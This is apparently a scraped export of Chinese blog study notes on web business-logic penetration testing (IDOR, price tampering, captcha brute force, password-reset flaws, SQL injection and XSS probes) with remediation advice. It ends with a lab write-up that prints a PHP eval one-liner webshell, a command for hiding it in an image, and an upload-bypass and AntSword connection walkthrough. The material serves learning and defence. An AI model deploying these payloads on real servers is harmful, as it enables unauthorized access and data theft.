修复建议后台请求要通过Session机制判断用户身份，如果需要客户端传输手机号码，则服务端需要校验手机号是否和登录者的身份一致，如发现不一致则拒绝将请求，防止水平越权，对于手机app程序，不要过于相信从手机中直接读取的手机号码，要做常规的身份认证，规范登录流程防止未授权登录 用户ID篡改测试（水平越权）从开发角度，用户登录后查看个人信息时，需要通过sessionid判定用户身份，然后显示相应用户的个人信息，但有时我们发现在get或post请求中有userid这类参数传输，并且后台通过此参数显示对应用户隐私信息，这就导致攻击者可以通过篡改用户Id越权访问其他用户隐私信息。 测试过程登录，点击收货地址修改，抓包，发现关键参数deliverID，修改为其他，提交后返回非本账户的联系人相关信息 修复建议后台功能请求要通过Session机制判断用户身份，不要相信客户端传来的用户ID,如果确实需要客户端传输userid，则服务端需要校验userid是否和登录者的Session身份一致，防止被攻击者篡改，未授权访问他人账号内容 邮箱和用户篡改测试（水平越权）在发送邮件或站内消息时，篡改其中的发件人参数，导致攻击者可以伪造发信人进行钓鱼攻击等操作，用户登录成功后拥有发信权限，开发者就信任了客户端传来的发件人参数，导致业务安全问题出现。 测试过程编写邮件点击发送，bp抓包，修改发件人参数inputFron，并提交发送邮件，收件时，发现发件人被篡改成功。 修复建议用户登录后写信、发送信息时需要通过Session机制判断用户身份，如果需要客户端传输邮箱、发件人，服务端需要校验邮箱、发件人是否和登录者的身份一致，防止被攻击者篡改用于钓鱼攻击。 商品编号篡改测试修改上皮内金额，篡改商品编号，低价购买高价商品。 测试过程 登录积分商城，挑选一个商品，编号为goods_id=xxx5ff7,需要30积分。 选择5积分商品，抓包修改goods_id，替换为xxx5ff7，替换成功，用5积分购买了30积分商品。 修复建议建议商品金额不要在客户端传入，防止被篡改，或确实需要在客户端传入金额，则服务端在收到请求后必须检查商品价格与交易金额一直，或对支付金额做签名校验。 竞争条件测试竞争条件：当两个或多个进程试图在同一时刻访问共享内存，或读写某些共享数据时，最后的竞争结果，取决于线程执行的顺序（线程运行时序），成为竞争条件。 在web安全中，在服务端逻辑与数据库读写存在时序问题时，就可能存在竞争条件漏洞，攻击者通常利用多线程并发请求，在数据库中的余额字段更新之前，多次兑换积分或购买商品，从中获利。 测试过程（教程只写了漏洞没写测试漏洞）攻击者在提交订单时抓包，设置很多个线程重放此包，在众多请求中，个别请求就有可能争取绕过金额，次数的判断，交易成功，攻击者从中获利。 修复建议在处理订单、支付等关键业务时，使用悲观锁或乐观锁保证事务的ACID特性（原子性、一致性、隔离性、持久性），并避免数据脏读（一个事务读取了另一个事务未提交的数据），解决竞争条件和并发操作可能带来的相关业务问题 业务授权访问模块非授权访问测试非授权访问是指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问到的页面或文本信息，可以尝试在登录某网站前台或后台之后，将相关的页面链接复制到其他浏览器或其他电脑上进行访问 测试过程在ie浏览器中登录某网站进行交费，复制缴费成功的url，在火狐浏览器里访问，成功访问 修复建议未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等敏感信息泄露，所以对未授权访问页面做Session认证，并对用户访问的每一个url做身份鉴别，正确地校验用户ID及Token等。 越权测试水平越权：相同权限的不同用户可以互相访问 垂直越权：使用权限低的用户可以访问权限较高的用户 水平越权 保存用户任务ID,抓包看到请求中关键参数ID,若可以更改能看到其他提交者，则存在水平越权漏洞，爆破自动更改关键参数ID. 垂直越权登录一个普通用户，超级管理员账号为admin，找到修改密码，将密码改为789，确定修改，抓包，发现两个参数，uid和pwd，即用户名和密码，将uid值改为admin，密码789不变。 提交修改后的数据包提示密码修改成功，登录管理员账号成功。 修复建议服务端需校验身份唯一性，自己的身份只能查看、修改、删除、添加自己的信息 输入/输出模块测试SQL注入测试sql注入就是通过把sql命令插入web表单提交或输入域名页面请求的查询字符串，最终达到欺骗服务器执行恶意的sql命令的目的。 按照请求类型分为：get型，post型，cookie型。 get和post区别是由表单的提交方式决定的，按照数据类型可分为数字型和字符型，数字型不用闭合前面的sql语句，字符型需要闭合。 测试方法分为报错型、延时型、盲注型、布尔型等。 数字型注入测试方法如下： 正常请求，查看页面 在请求的参数后加and 1=1，如果可以添加执行，则和第一步的返回页面并无差异。 在请求参数后加and 1=2，如果返回页面与第二步页面明显不同，或有所差异，则断定存在数字型注入 字符型注入测试方法如下： 正常请求查看页面（如查询admin用户信息，则返回admin用户的信息） 在查询的参数后加 'or 1=1,加单引号的目的是闭合前面的sql语句并与后面的语句形成语法正确的sql语句，如果可以添加并能够执行，则返回除admin用户外所有用户的信息，这时可以判断存在字符型注入。 测试过程略 修复建议每个提交信息的客户端页面、通过服务器端脚本（JSP、ASP、ASPX、PHP等）生成的客户端页面、提交的表单（FORM）或发出的链接请求中包含的所有变量，必须对变量的值进行检查，过滤其中包含的特殊字符，或对字符进行转义处理。 Sql语句关键词：and,or ,select,declare,update,xp_cmdshell; sql语句特殊符号'、，''、等 web应用系统接入数据库服务器使用的用户不应为系统管理员，用户角色应遵循最小权限原则。 XSS测试跨站脚本漏洞是web应用程序在将数据输出到网页的时候存在问题，导致恶意攻击者可以在往web页面里插入而已js,html代码，并将构造的而已数据显示在页面的漏洞中。攻击者一般利用此漏洞窃取或操纵客户会话和cookie，用于模仿合法用户，从而使攻击者以该用户身份查看或变更与用户记录以及执行事务。 跨站一般情况下主要分为存储型xss，反射性xss，DOM型跨站。 存储型xss脚本可直接写入服务端数据库，反射性不写入数据库，由服务端解析后在浏览器生成一段类似&lt;script&gt;alert(/xss/)&lt;/script&gt;的脚本。 反射性跨站测试主要是在url或输入框内插入一段跨站脚本，观察是否能弹出对话框。 存储型xss主要是在网站的留言板、投诉、建议等输入框内输入一段跨站脚本，看能否插入数据库，插入成功的表现为当网站管理人员查看该留言时，会执行跨站语句，或者当普通用户再次1访问该页面时，会执行跨站语句，如弹出对话框。 修复建议每个提交信息的客户端页面、通过服务器端脚本（jsp,asp,aspx,php）生成的客户端页面、提交的表单（form）或发出的链接请求中包含的所有变量，必须对变量的值进行检查，过滤其中包含的特殊字符，或对字符进行转义处理。 HTML标签的&lt;、“、’、%等，以及这些符号的Unicode值 客户端脚本（JavaScript、VBScript）关键字：JavaScript、script等。 对于信息搜索功能，不应在搜索结果页面中回显搜索内容。同时应设置出错页面，防止Web服务器发生内部错误时，将错误信息返回给客户端 定义允许的行为，确保Web应用程序根据预期结果的严格定义来验证所有输入参数（Cookie、标头、查询字符串、表单、隐藏字段等）。 检查POST和GET请求的响应，以确保返回的对象是预期的内容且有效 通过对用户提供的数据进行编码，从用户输入中移除冲突的字符、括号和单双引号。这将防止插入的脚本以可执行的格式发送给最终用户。 只要可能，就应将客户端提供的所有数据限制为字母数字数据。使用此过滤机制时，如果用户输入“&lt;script&gt;alertdocumentcookie（'aaa'）&lt;/script&gt;”，将缩减为“scriptalertdocumentcookiescript”。如果必须使用非字母数字字符，请先将其编码为HTML 实体，然后再将其用在HTTP响应中，这样就无法将它们用于修改HTML文档的结构。 使用双因素客户身份验证机制，而非单因素身份验证 在修改或使用脚本之前，验证脚本的来源。 不要完全信任其他人提供的脚本并用在自己的代码中 命令执行测试在应用需要调用一些外部程序去处理内容的情况下，会用到一些执行系统命令的函数，如php中的system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。测试中如果没有对参数（cmd=、command、excute=等）进行过滤，就可以直接造成命令执行漏洞或配合绕过及命令连接符（&amp;、|、||、；）等进行命令执行漏洞测试 测试过程由于未对register_key参数进行过滤可能存在命令执行漏洞，抓包并对其进行测试，构造命令执行语句并执行成功，证明此参数为经严格过滤造成命令执行漏洞。 （略，哪天找时间搭一个dvwa靶场） 修复建议尽量少用执行命令的函数或者直接禁用，参数值尽量使用引号包括在使用动态函数之前，确保使用的函数是指定的函数之一，在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义。 回退模块测试回退测试web业务在密码修改成功后或者订单付款成功后等业务模块，在返回上一步重新修改密码或者重新付款时存在重新设置密码或者付款的功能，这时如果能返回上一步重复操作，而且还能更改或者重置结果，则存在业务回退漏洞。 修复建议对于业务流程有多步的情况，如修改密码或重置密码等业务，首先判断该步骤的请求是否是上一步骤的业务所发起的，如果不是则返回错误提示或页面失效。 验证码机制测试验证码暴力破解测试验证码机制主要被用于防止暴力破解，防止DDoS攻击，识别用户身份等，常见的验证码主要有图片验证码、邮件验证码、短信验证码、滑动验证码和语音验证码. 测试过程攻击者填写任意手机号进行性注册，服务器向攻击者填写的手机号码发送短信验证，攻击者设置验证码范围，对验证码进行暴力破解，通过返回数据包判断是否破解成功，然后通过破解成功的验证码完成注册。 修复建议 设置验证码的失效时间，建议为180秒 限制单位时间内验证码的失败尝试次数，如五分钟内连续失败5次即锁定该账号15分钟 验证码重复使用测试在网站的登录或评论等页面，如果验证码认证成功后没有将session及时清空，将会导致验证码首次认证成功之后可重复使用，测试时可以抓取携带验证码的数据包重复提交，查看是否提交成功。 测试过程攻击者填写投诉建议，输入页面验证码，抓取提交的数据包，使用发包工具对数据包进行重复提交，然后查看投诉建议页面是否成功提交了多个投诉信息。 输入内容，输入验证码，抓数据包，并修改内容参数的值，通过bp重复提交投诉信息，经过暴力重复提交，客户端显示提交成功，用首次验证码成功多次提交 修复建议针对验证认证次数问题，建议验证码在一次认证成功后，服务端清空认证成功的Session，有效防止一次认证反复使用的问题 验证码客户端回显测试当验证码在客户端生成而非服务器端生成时，就会造成该问题，当客户端需要和服务端进行交互发送验证码时，可借助浏览器的工具查看客户端与服务器进行交互的详细信息 测试过程攻击者进入找回密码页面，输入手机号与证件号，获取验证码，服务器会向手机发送验证码，通过浏览器工具查看返回包信息，如果返回包中含验证码，证明存在此类问题。 修复建议 禁止验证码在本地客户端生成，应采用服务器端验证码生成机制 设置验证码的时效性，如180秒过期 验证码应随机生成，且使用一次即失效 验证码绕过测试通过修改提交服务器返回的数据，可以实现绕过验证码，执行我们的请求 测试过程攻击者进入注册账户页面，输入任意手机号码，获取验证码，在注册账户页面填写任意验证码，提交请求并抓包，使用抓包工具查看并修改返回包信息，转发返回数据包，查看是否注册成功。 修复建议在服务端增加验证码的认证机制，对客户端提交的验证码进行二次校验。 验证码自动识别测试以图形验证码为例，一般队医此类验证码的识别流程为：图像二值化处理-&gt;去干扰-&gt;字符分割-&gt;字符识别 图像二值化就是将图像上像素点的灰度值设置为0或255，也就是将整个图像呈现出明显的黑白效果 为防止验证码被自动识别，通常加入一些点、线、色彩之类的方式进行图像干扰。 字符分割主要包括从验证码图像中分割出字符区域，以及把字符区域划分成单个字符 字符识别就是把处理后的图片还原回字符文本的过程。 测试过程攻击者访问网站登录页面，通过刷新你验证码页面查看验证码组成规律，进行图像二值化、去干扰等处理，并进行人工对比，存储成功识别的验证码包，截入工具，利用工具对登录页面进行暴力破解，根据返回包的大小和关键字判断是否破解成功。 用bp抓登录包，将登录包放在PKAV HTTP Fuzzer工具的请求包中，设置验证码标志位，用户名和密码标志位。 进行验证码爆破，发现长度为611的返回包，可成功登录网站。 修复建议 增加背景元素的干扰，如背景色，背景字母等 字符的字体进行扭曲、粘连 使用公式、逻辑验证方法等作为验证码，如四则运算法、问答题等 图形验证码和使用者相关，比如选择联系人头像、选择购买过的物品等作为验证码 业务数据安全测试商品支付金额篡改测试通常在订购类交易流程中，容易出现服务器端未对用户提交的业务数据进行强制校验，过度信赖客户端提交的业务数据而导致的商品金额篡改漏洞 测试过程该测试主要针对订单生成过程中存在商品支付金额校验不完整而产生业务安全风险点，通常导致攻击者用实际支付远低于订单支付的金额订购商品的业务逻辑漏洞。 选择购卡面值进入支付平台，抓包篡改支付请求中明文金额字段，跳转支付平台，完成篡改后订单金额支付流程 修复建议商品信息，如金额、折扣等原始数据的校验应来自于服务器端，不应接受客户端传递过来的值 商品订购数量篡改测试商品数量篡改测试是通过在业务流程中抓包修改订购商品数量等字段，如将请求中的商品数量修改成任意非预期数额、负数等后进行提交，查看业务系统能否以修改后的数量完成业务流程。 测试过程将商品放入购物车，在购物车中进行礼品兑换，确认商品订单准备进行数据包信息篡改，抓包，将商品数量参数改为负数，并保存， 可以看到购物车中实际支付积分已经变为负积分。 添加配送信息，确认订单信息，获取验证码后通过，进入订单确认页面，提交订单订购请求。 修复建议服务端应当考虑交易风险控制，对产生异常情况的交易行为（如用户积分数额为负值、兑换库存数量为0的商品等）应当直接予以限制、阻断，而非继续完成整个交易流程 前端JS限制绕过测试商品在限制用户购买数量时，服务器仅在页面通过js脚本限制，未在服务器端校验用户提交的数量，通过抓取客户端发送的请求包修改JS端生成处理的交易数据，如将请求中的商品数量改为大于最大数限制的值，查看能否以非正常业务交易数据完成业务流程。 测试过程该项测试主要针对电商平台由于交易限制机制不严谨、不完善而导致的一些业务逻辑问题 购买限购商品，数量为2份，加入购物车。 客户端在前端浏览器使用js做了购买限制，尝试绕过限制提交购买请求，可以通过抓包修改数量字段，改为100个后成功提交。 修复建议商品信息，如金额、折扣、数量等原始数据的校验应来自于服务器端，不应该完全相信客户端传递过来的值。类似的跨平台支付业务，涉及平台之间接口调用，一定要做好对重要数据的完整性校验，确保业务重要数据在平台间传输的一致。 请求重放测试（不理解）商品首次购买成功后，参照订购商品的正常流程请求，进行完全模拟正常订购业务流程的重放操作，可以实现一次购买多次收获等违背正常业务逻辑的结果。 测试过程在生成订单流程时抓取订购请求，观察每次订购相同商品的请求是否存在不同的随机token、可变参数等，若有则检查这些随机数的变化情况和失效请款，是否在当前订购流程中唯一有效。 尝试重放之前已经完成流程的订购请求，观察服务器端是否做出正确响应，若订购再次生效，订单再次生成则表明服务器存在脆弱性。 修复建议用户每次订单token不应该能重复提交，避免产生重放订购请求的情况。在服务器订单生成关键环节，应该对订单token对应的订购信息内容、用户身份、用户可用积分等进行强校验。 业务上限测试业务上限测试主要是针对一些电商类应用程序在进行业务办理流程中，服务端没有对用户提交的查询范围、订单数量、金额等数据进行严格校验而引发的一些业务逻辑漏洞。在业务流程中通过向服务端提交高于或低于预期的数据以校验服务端是否对所提交的数据做预期强校验。存在此类脆弱性的应用程序，通常表现为查询到超出预期的信息、订购或兑换超过预期范围的商品等。 测试过程判断应用程序是否对业务预期范围外的业务请求做出正确回应。 在业务查询中只允许登录用户查询6个月内受理记录，单抓包分析出查询请求中存在明文字段month，修改查询范围到6个月以上提交，可以成功，表明该功能不符合业务要求 修复建议在服务器端应对订单token对应的订购信息内容、用户身份、用户可用积分等进行强校验，服务端应考虑交易风险控制，对产生异常情况的交易行为直接予以限制、阻断，停止完成整个交易流程。 业务流程乱序测试业务流程绕过测试该项主要针对业务流程的处理流程是否正常，确保攻击者无法通过技术手段绕过某些重要流程步骤，检验办理业务过程中是否有控制机制来保证其遵循正常流程。 测试过程攻击者访问注册页面，注册测试账户，充值提交并抓取数据包，填写任意充值金额并抓包，获取订单号，利用订单号构造充值链接并访问链接，查看是否充值成功，如果充值成功说明存在业务流程绕过问题。 修复建议建议对敏感信息如身份ID、账号密码、订单号、金额等进行加密处理，并在服务端对其进行二次比对。 密码找回模块测试验证码客户端回显测试找回密码测试中要注意验证码是否会回显在响应中。 测试流程填入要找回的账号，bp抓返回包找到正确验证码，将正确验证码发送给服务端已达到密码重置的目的。 修复建议避免返回验证码到响应包中，验证码一定要放在服务端校验 验证码暴力破解测试找回密码功能模块中通常会将用户凭证发送到用户自己才可以看到的手机号或邮箱中，但有些应用在验证码发送功能模块中验证码位数及复杂性较弱，也没有对验证码做次数限制而导致验证码可被暴力枚举并修改任意用户密码。 测试过程在app的找回密码功能，输入手机号并发送验证码（4位）， 填写任意4位验证码，当请求包被拦截后可以观察到用户手机号，验证码（自己填的那个），密码。 将请求包发送到bp的Intruder模块中，并把验证码参数进行枚举测试。 修复建议建议对用户输入的验证码校验采取错误次数限制并提高验证码的复杂度。 接口参数账号修改测试找回密码功能逻辑中常常会在用户修改密码接口提交此参数中存在传递用户账号的参数，而用户账号参数作为一个可控的变量是可以被篡改的，从而导致修改账号密码的凭证或修改的目标账号出现偏差，最终造成任意账号密码修改的漏洞。 通常在找回密码逻辑中，服务端会要求用户提供要修改的账号，给这个账号发送只有账号主人才能看到的凭证，但如果服务端对账号的控制逻辑不当，就会导致原有账号被篡改为其他账号，服务端把凭证发送给篡改后的账号的邮箱或手机，最终造成可利用凭证重置任意账号密码的漏洞。 测试流程拦截前端请求，通过修改请求内邮箱或手机号等参数，将修改后数据发送给服务器进行欺骗，达到密码重置的目的。 修复建议对找回密码的token做一对一的校验，一个token只能修改一个用户，同时保证token不泄露。 Response状态值修改测试修改请求的响应结果来达到密码啊重置的目的。该漏洞利用方式通常在服务端发送某个密码重置的凭证请求后，出现特定的响应值，比如true、1、ok、success等，网站看到回显内容为特定值后即修改密码，通常这种漏洞的回显值校验是在客户端进行的，所以只需要修改回显即可。 修复建议不要在前端利用服务端返回值判断是否可以修改密码，要把整个校验环节交给服务端验证。 Session覆盖测试（任意密码重置漏洞）找回密码逻辑漏洞测试中也会遇到参数不可控的情况，比如要修改的用户名或者绑定的手机号无法在提交参数时修改，服务端通过读取当前session会话来判断要修改密码的账号，这种情况下能否对Session中的内容做修改以达到任意密码重置的目的呢？ 在某网站中的找回密码功能中，业务逻辑是：由用户使用手机进行注册，然后服务端向手机发送验证码短信，用户输入验证码提交后，进入密码重置页面。 对网站中Session覆盖的测试如下： （1）需要准备自己的账号接收凭证（短信验证码）； （2）获得凭证校验成功后进入密码重置页面； （3）在浏览器新标签重新打开找回密码页面，输入目标手机号； （4）此时当前 Session账户已经被覆盖，重新回到第二步中打开的重置密码页面即可重置目标手机号。 测试过程 在找回密码页面输入A手机号，接受验证码，通过验证后，进入密码重置页面 打开一个新标签，进入找回密码的第一步页面，输入B手机号码，向B手机号发送验证码，虽然无法拿到B手机号验证码，但是服务端已经将当前Session会话设置为B手机号的用户，这时候再刷新A手机号密码重置页面。 刷新后A手机号已经改为B手机号，说明Session成功覆盖。 修复建议Session覆盖类似于账号参数的修改，只是以控制当前Session的方式篡改了要重置密码的账号，在重置密码请求中一定要对修改的账号和凭证是否一致做进一步的校验。 弱Token设计缺陷测试（看懂了但是不会做）在找回密码功能中，网站向用户邮箱发送找回密码链接，用户进入链接进入密码重置页面，链接通常会加入校验参数来确认有效性，通过校验参数的值与数据库生成的值是否一致来判断当前找回密码的链接是否有效。 例如，网站给出的找回密码的url如下，单击这个链接将跳转到重置密码页面。 http://www.xxx.com/findpwd?uid=xx-uu-xx-sxx&amp;token=1497515314 uid对应修改密码的账号，token就是校验参数，cancel系统使用时间戳生成token，通过时间格式化后发现确实是日期，那么token就是可预测的一个时间范围，可以暴力枚举。 测试流程 在密码找回功能中填写邮箱，多点击几次发送验证信息，可以在邮箱中获得多个找回密码的凭证，多封密码找回邮件，关照凭证规律，通过对比发现token不断变化，参数通过base64编码 解码查看，发现token值是base64(用户邮箱+随机4位验证码)，就可以暴力枚举获得验证码，加上用户名加上base64编码，最后得到任意用户的密码找回凭证。 修复建议密码找回token不能使用时间戳或用户邮箱和较短有规律可循的数字字符，应当使用复杂的token生成机制让攻击者无法推测出具体的值。 密码找回流程绕过测试用户修改密码需要向服务器发送修改密码请求，服务器通过后再修改数据库中相应的密码，所以在测试中我们首先要收集三个步骤的请求接口，这样我们可以指姐姐跳过凭证校验的接口去尝试直接重置密码。 测试流程 先注册一个账号用于测试，在找回密码页面输入账号，找回密码页面url为GET/account/findPassword.html 进入凭证验证流程，url为GET/forgetpwd/findPassNext.do 通过验证后进入重置密码，GET/forgetpwd/emailValidateNext.do 获取到三个步骤的url，尝试在输入账号后进入验证身份页面，修改该url为密码重置的url 经测试发现无需验证身份就可以直接进入重置密码页面，绕过了验证身份一步。 修复建议防止跳过验证步骤一定要在后端逻辑校验中确认上一步流程已经完成。 业务接口调用模块测试接口调用重放测试在短信、邮件调用业务或生成业务数据环节中，对业务环节进行调用(重放)测试，若业务经过调用后多次生成有效的业务或数据结果，可判断为存在接口调用问题 测试流程在购买机票提交订单环节抓包，bp对生成订单的数据包进行重放测试。订单在一分钟内重复生成。 修复建议 对生成订单环节采用验证码机制，防止生成数据业务被恶意调用 每一个订单使用唯一的token，订单提交一次后，token失效 接口调用遍历测试web接口一般将常见的一些功能需求进行封装，通过传入不同的参数来获取数据或者执行相应的功能，例如通过接口传入id参数，返回对应id的一些信息，在安全测试中，可以使用bp作为http代理，记录所有请求和响应信息，通过bp以登录后的状态对整站进行爬取，再使用过滤功能找到传入id参数的http请求，通过intruder对id参数进行遍历，看是否返回不同的响应信息，若不同的id值对应不同用户的信息，则说明存在漏洞。 测试过程（看不懂，书166页）略 修复建议在session中存储当前用户的凭证或id，只有传入凭证或id参数值与Session中的一致才返回数据内容 接口调用参数篡改测试修改对应请求中的手机号或邮箱参数值，修改后能接收到信息证明漏洞存在 测试过程 在验证码页面单击重新发送，抓包，将手机号码参数改为其他手机号，修改后的手机接收到验证码 修复建议 会话session中存储重要凭证，在忘记密码、重新发送验证码等业务中，从session获取用户凭证而不是从客户请求的参数中获取 从客户端处获取手机号、邮箱等账号信息，要与session中的凭证进行对比，验证通过后才允许进行业务操作。 接口未授权访问/调用测试在正常业务中，敏感功能的接口需要对访问者身份进行验证，通过后才允许调用接口，若接口没有身份验证，那么攻击者无须登录验证即可调用接口操作。 bp作为Http代理，在登录状态下记录所有请求和响应信息，筛选出敏感功能、返回敏感数据的请求，在未登录的情况下，使用浏览器访问对应敏感功能的请求，若返回的数据与与登录状态后的一致，则存在漏洞 测试过程（又是个bp爬取的，妈的不会，176页）略 修复建议采用token校验方式，在url中添加一个token参数，只有token验证通过才返回接口数据且token使用一次后失效 在接口被调用时，后端会对会话状态进行验证，若已经登录便返回接口数据，如果未登录则返回错误信息。 Callback自定义测试在浏览器中存在同源策略，同源策略是指域名、协议、端口相同，当使用Ajax异步传输数据时，非同源域名之间会存在限制，其中有一种解决方法时jsonp，基本原理是利用了html里&lt;script&gt;&lt;/script&gt;元素标签，远程调用json文件来实现数据传递，jsonp技术这种一般使用callback（回调函数）参数来声明回调时所使用的函数名，由于没有使用白名单的方法进行限制callback的函数名，导致攻击者可以自定义callback内容，从而触发xss等漏洞 测试过程（178页）略 修复建议 严格定义 HTTP 响应中的 Content-Type 为json 数据格式：Content-Type：application/json 建立callback函数白名单，如果传入的callback参数值不在白名单内，跳转到统一的异常界面阻止其继续输出。 对callback参数进行HTML实体编码来过滤掉“&lt;”、“&gt;”等字符。 WebService测试WebService是一种跨编程语言和跨操作系统平台的远程调用技术。XML+XSD、SOAP（Simple Object Access Protocol）和WSDL（WebServices Description Language）就是构成WebService平台的三大技术，其中XML+XSD用来描述、表达要传输的数据；SOAP是用于交换XML编码信息的轻量级协议，一般以XML或者XSD作为载体，通过HTTP协议发送请求和接收结果，SOAP协议会在HTTP协议的基础上增加一些特定的HTTP消息头；WSDL是一个基于XML的用于描述Web Service及其函数、参数和返回值的语言。 webservice就是一个应用程序向外界暴力出一个能通过web进行调用的api,它接收用户输入的参数，然后返回相关的数据内容，若一个webService完全信任用户的输入，不进行过滤，则有可能导致sql注入漏洞发生。 测试过程（183页）修复建议 为webservice添加身份认证，认证成功后才允许访问和调用 webservice中接收输入参数的函数，在后端应该对输入参数进行过滤及净化，在处理后才入库查询 在敏感功能的函数中，添加密码认证，认证后才允许调用敏感功能的函数。 实践篇账号安全案例总结略 中间人攻击是攻击者插入到原本直接通信的双方中间，让双方以为还在直接跟对方通信，但实际上双方的通信对象已变成了攻击者，同时信息已经被中间人获取或篡改。而中间人攻击不仅可以捕获HTTP未加密的传输数据，更可以捕获HTTPS协议加密的数据。HTTPS中间人攻击一般分为SSL连接建立前的攻击，以及HTTPS传输过程中的攻击。常见的HTTPS中间人攻击，会首先需结合ARP、DNS欺骗、伪造CA证书等技术，来对会话进行拦截。 SSL证书欺骗通过DNS劫持和局域网ARP欺骗甚至网关劫持等技术，将用户访问重定向到攻击者的设备上，让用户机器与攻击者机器建立https链接，而攻击者机器再跟web服务端连接，这样攻击者分别与用户和真正的服务器建立ssl连接。 SSL劫持将页面中https超链接替换成http版本，用户始终以明文形式进行通信。 撞库攻击","categories":[],"tags":[{"name":"业务渗透","slug":"业务渗透","permalink":"https://sinky.top/tags/%E4%B8%9A%E5%8A%A1%E6%B8%97%E9%80%8F/"},{"name":"WEB，学习笔记","slug":"WEB，学习笔记","permalink":"https://sinky.top/tags/WEB%EF%BC%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"php学习1","slug":"php学习1","date":"2022-11-07T14:11:19.283Z","updated":"2022-11-23T01:56:11.222Z","comments":true,"path":"2022/11/07/php学习1/","link":"","permalink":"https://sinky.top/2022/11/07/php%E5%AD%A6%E4%B9%A01/","excerpt":"","text":"网站基本概念 服务器：提供计算机服务的机器，取决于机器上所安装的软件（服务软件） web服务器：提供web服务（网站访问），需要安装web服务软件，Apache,tomcat,iis等 IP：网络互连协议，为计算机网络相互连接进行通信而设计的协议，IP地址具有唯一性（每台电脑都有一个唯一的IP地址） 域名：由遗传用点分割的名字组成（www.baidu.ccom）的Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位，一个域名的目的是便于记忆和沟通的一组服务器的地址。 特殊IP:127.0.0.1 代表本机 特殊域名：localhost.com DNS:域名系统，作为域名和IP地址相互映射的一个分布式数据库，使用户更方便的访问互联网，通过主机名，得到该主机名对应的IP地址的过程叫做域名解析。 用户输入域名 localhost -&gt; DNS(localhost 127.0.0.1) -&gt; 服务器电脑 端口：(port) 设备与外界通讯交流的出口，分为虚拟端口和物理端口 虚拟端口：指计算机内部或交换机路由器内的端口，不可见，如80端口、21、23等； 物理端口：又称为接口，时可见接口，计算机背板的RJ45网口，交换机路由器集线器等RJ45端口 3.用户输入域名 localhost:端口 -&gt; DNS(localhost 127.0.0.1) -&gt; 服务器电脑 -&gt; 软件（服务） Web程序的访问流程web分为两类：静态网站和动态网站 浏览器发起访问-&gt; DNS解析域名-&gt; 服务器电脑-&gt; 服务软件 静态网站的访问访问http://localhost:80/index.html 动态网站访问与静态类似，但比静态多出两个内容：服务器端解析、数据库。 访问http://localhost:80/index.php 安装环境安个phpstudy就行了","categories":[],"tags":[{"name":"php","slug":"php","permalink":"https://sinky.top/tags/php/"}]},{"title":"WebShell文件上传漏洞分析溯源(第3题)","slug":"靶场：WebShell文件上传漏洞分析溯源(第3题)","date":"2022-11-02T03:29:18.354Z","updated":"2022-11-02T07:18:33.796Z","comments":true,"path":"2022/11/02/靶场：WebShell文件上传漏洞分析溯源(第3题)/","link":"","permalink":"https://sinky.top/2022/11/02/%E9%9D%B6%E5%9C%BA%EF%BC%9AWebShell%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC3%E9%A2%98)/","excerpt":"","text":"背景介绍某部门为了方便内部人员上传聚餐的活动图片，在某服务器上新增的图片上传功能在被安全工程师”墨者”检测发现漏洞后，程序员做了修复，【上一次漏洞地址】。”墨者”负责对修复后的系统做复测，然而发现还是存在高危漏洞。 实训目标 掌握常见图片类型的文件头内容； 掌握表单数据通过POST提交数据时，对数据的修改方法； 了解WebShell是什么及其作用； 了解PHP程序的WebShell脚本的执行原理； 解题方向 绕过页面对可执行文件上传的限制，利用WebShell读取服务器上的源代码内容。 解题随便上传一个图片，返回信息为：文件上传成功，保存于：uploads/王也1.jpg 制作一句话图片木马 &lt;?php @eval($_POST['woshimuma']); ?&gt; 新建文件下一句话，在其下存入木马文件2.php和图片1.jpg,在该目录下打开cmd copy 1.jpg/b+2.php muma.jpg 生成一句话图片木马，上传，bp拦截，修改muma.jpg后缀为php。 上传成功，得到路径，使用蚁剑连接。 蚁剑连接成功：（图床又有毛病了，直接手打吧） 1234url地址： ip:端口/uploads/muma.php连接密码： woshimuma1编码设置： UTF8连接类型： PHP 找到key: mozheece9dc52403a1a5249a9075e4de 拓展常见图片的头文件格式 .jpeg 文件头标识 (2 bytes): 0XFF, 0XD8 (SOI) 文件结束标识 (2 bytes): 0XFF, 0XD9 (EOI) .png 文件头标识 (8 bytes)：0X89 0X50 0X4E 0X47 0X0D 0X0A 0X1A 0X0A .bmp 文件头标识 (2 bytes)：0X42 0X4D .gif 文件头标识 (6 bytes)0X47 0X49 0X46 0X38 0X39(37) 0X61 G I F 8 9 (7) a .tiff 文件头标识 (2 bytes) 0X4D 0X4D 或 0X49 0X49 Form表单、四种常见的POST请求提交数据方式浏览器行为：Form表单提交 form表单常用属性 action: url地址，服务器接收表单数据的地址 method: 提交服务器的http方法，一般为post和get name: 唯一性 enctype: 表单数据提交时使用的编码类型，默认使用pplication/x-www-form-urlencoded,如果使用post请求，则请求头中的content-type指定值就是该值，如果表单中有上传文件，编码类型需要使用multipart/form-data类型，才能完成传递文件数据。 enctype为form表单数据的编码格式，Content-type为Http传输的数据的编码格式。 浏览器提交表单时，会执行如下步骤 识别出表单中表单元素的有效项，作为提交项 构建一个表单数据集 根据form表单中的enctype属性的值作为content-type对数据进行编码 根据form表单中的action属性和method属性向指定的地址发送数据 提交方式 get: 表单数据会被encodeURIComponent后以参数的形式：name=value&amp;name2=value2附带在url?后面，再发送给服务器，并在url中显示出来。 post: enctype默认application/x-www-form-urlencoded对表单数据进行编码，数据以键值对在http请求体重发送给服务器，如果enctype属性为multipart/form-data,则以消息的形式发送给服务器。 Post请求下的Content-Type类型（编码类型） application/x-www-form-urlencoded 浏览器的原生 &lt;form&gt; 表单，如果不设置 enctype 属性，那么最终就会以 application/x-www-form-urlencoded 方式提交数据。请求类似于下面这样: POST http://www.example.com HTTP/1.1 Content-Type: application/x-www-form-urlencoded;charset=utf-8 